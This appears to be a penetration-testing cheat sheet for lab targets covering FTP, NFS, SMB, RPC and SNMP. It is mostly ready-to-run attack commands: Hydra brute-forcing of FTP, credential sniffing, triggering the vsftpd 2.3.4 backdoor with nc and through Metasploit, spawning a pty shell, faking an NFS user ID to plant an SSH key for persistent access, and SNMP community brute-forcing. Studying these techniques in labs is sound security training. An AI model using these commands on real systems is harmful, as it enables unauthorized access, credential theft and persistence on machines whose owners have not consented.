📡 Network Protocols
Nmap (Network Mapper) is a powerful open-source tool used for network discovery and security auditing. It supports saving scan results in multiple formats, making it a go-to tool for penetration testers.

📁 FTP (File Transfer Protocol)
FTP is a standard network protocol used to transfer files between a client and server over TCP/IP, typically via ports 20/21.
It requires two channels:

Command channel (for control commands)

Data channel (for transferring files)

🚀 Penetration Testing on FTP
🔓 Anonymous Login
If port 21 is open (seen via Nmap), you can attempt to login with anonymous credentials:

bash
Copy
Edit
ftp 192.168.188.131
Name: Anonymous
Password: Anonymous
Successful login grants you access to the FTP server.



📡 Sniffing FTP Login Credentials
FTP sends traffic unencrypted. Capture traffic using Wireshark to view credentials:

bash
Copy
Edit
ftp 192.168.188.131
Apply the Wireshark filter:

plaintext
Copy
Edit
frame contains "PASS"
Captured credentials will appear in clear text.



🔥 FTP Brute-Force Attack
Using Hydra to perform dictionary attacks:

bash
Copy
Edit
hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp


🛠️ Exploiting FTP via Nmap Script (vsftpd backdoor)
Nmap script to detect backdoor:

bash
Copy
Edit
sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse


Upon detection:

bash
Copy
Edit
nc 192.168.188.131 21
USER random6char:)
PASS random6char

nc 192.168.188.131 6200
whoami
python -c 'import pty; pty.spawn("/bin/bash")'


🎯 Exploiting FTP with Metasploit (vsftpd 2.3.4)
bash
Copy
Edit
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.188.131
exploit
Post exploitation:

bash
Copy
Edit
python -c 'import pty; pty.spawn("/bin/bash")'
find / -iname user.txt -exec wc {} \;


📂 NFS (Network File System)
NFS allows remote hosts to mount file systems over a network.

Scan NFS:

bash
Copy
Edit
nmap -p 2049 -sV 192.168.188.131
Mount NFS share:

bash
Copy
Edit
sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock
Check permissions:

bash
Copy
Edit
ls -ld vulnix
If permission denied, identify user/group and create matching user:

bash
Copy
Edit
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --groups vulnix_group vulnix
SSH Key Setup:

bash
Copy
Edit
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub | sudo -u vulnix tee -a vulnix/.ssh/authorized_keys
ssh vulnix@192.168.188.137


📦 SMB (Server Message Block)
SMB is used for sharing files, printers, and communications between devices.

🎯 SMB Enumeration
bash
Copy
Edit
sudo nmap -p 445 -sV -sC 192.168.188.131
enum4linux -L -S 192.168.188.131
smbclient -L 192.168.188.131 -N
smbmap -H 192.168.188.131
Anonymous login:

bash
Copy
Edit
smbclient --no-pass //192.168.188.131/tmp
🔥 SMB Vulnerabilities
If Samba 3.0.20 found:

bash
Copy
Edit
searchsploit samba 3.0.20
cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
If writeable share found, try uploading payloads for RCE.

📞 RPC (Remote Procedure Call)
Remote command execution protocol.

Connect:

bash
Copy
Edit
rpcclient 192.168.188.131 -U ''
srvinfo
enumdomusers
🌐 SNMP (Simple Network Management Protocol)
SNMP is used for managing network devices remotely.

Scan:

bash
Copy
Edit
snmpwalk -v1 -c public 192.168.188.131
Brute-force:

bash
Copy
Edit
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
🗂️ LDAP (Lightweight Directory Access Protocol)
LDAP allows centralized directory services, often storing user and network info.

🔐 SSH (Secure Shell)
SSH provides secure remote login.

🛠️ Create SSH RSA Key:
bash
Copy
Edit
ssh-keygen -t rsa -b 4096
🔐 Copy SSH Public Key:
bash
Copy
Edit
ssh-copy-id -i ~/.ssh/id_rsa.pub user@server_ip
Or manually append it to ~/.ssh/authorized_keys.

🧠 Quick Tips
showmount -e IP → List NFS exports

smbmap / enum4linux / smbclient → List SMB shares

rpcclient srvinfo → Get server info

onesixtyone / snmpwalk → SNMP enumeration

Metasploit → Look for known vulnerabilities

✨ Resources
HackTricks - SNMP Pentesting

SSH Public Key Authentication Guide
